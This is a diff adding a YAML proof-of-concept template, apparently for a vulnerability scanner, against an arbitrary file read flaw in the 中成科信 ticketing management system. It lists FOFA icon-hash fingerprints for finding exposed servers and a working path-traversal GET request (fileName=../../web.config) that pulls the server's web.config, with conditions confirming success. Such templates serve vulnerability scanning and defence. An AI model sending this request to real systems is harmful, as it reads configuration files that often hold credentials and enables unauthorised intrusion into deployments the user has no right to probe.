@@ -1,0 +1,15 @@
+id: poc-yaml-zckx-ordermanager-ashx-anyfile-read
+info:
+  name: 中成科信票务管理系统 OrderManager.ashx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 中城科信票务管理平台
+  fofa: icon_hash="1632964065" || icon_hash="-2142050529"
+requests:
+- method: GET
+  path: /SystemManager/OrderManager/OrderManager.ashx?Method=DownTemplate&fileName=../../web.config
+  expression: status_code == 200 && contains(body,"web.config") && contains(body,"zckx")
+    && contains(body,"</system.web>") && contains(body,"<configuration>") && contains(content_type,"text/plain")
+variables: {}
+transport: http
